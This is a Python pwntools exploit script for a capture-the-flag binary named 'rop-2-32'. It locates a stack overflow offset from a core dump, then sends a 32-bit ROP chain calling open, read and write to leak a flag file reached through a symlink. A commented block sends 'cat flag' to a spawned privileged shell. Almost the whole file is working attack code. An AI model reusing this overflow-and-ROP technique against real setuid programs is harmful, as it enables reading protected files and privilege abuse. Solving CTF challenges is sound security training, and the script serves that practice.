from pwn import *
import os

DEBUG = False 
file = "./rop-2-32"
env = {"PATH":"$PATH:."}

elf = ELF(file)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(1000).find(p32(core.eip))
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x80485fc
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

os.symlink("./flag", "./main")

opn = p32(elf.symbols["open"])
read = p32(elf.symbols["read"])
write = p32(elf.symbols["write"])
writeable = p32(0x804a000 + 0x500)

main = p32(0x80492af)
pop3 = p32(0x08048689)

payload = flat (
    b"A" * max_len,
    opn,    
    pop3,
    main,
    p32(0),
    p32(0),
    read,
    pop3,
    p32(3),
    writeable,
    p32(64),
    write,
    b"A" * 4,
    p32(1),
    writeable,
    p32(64),
)

io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
os.unlink("./main")
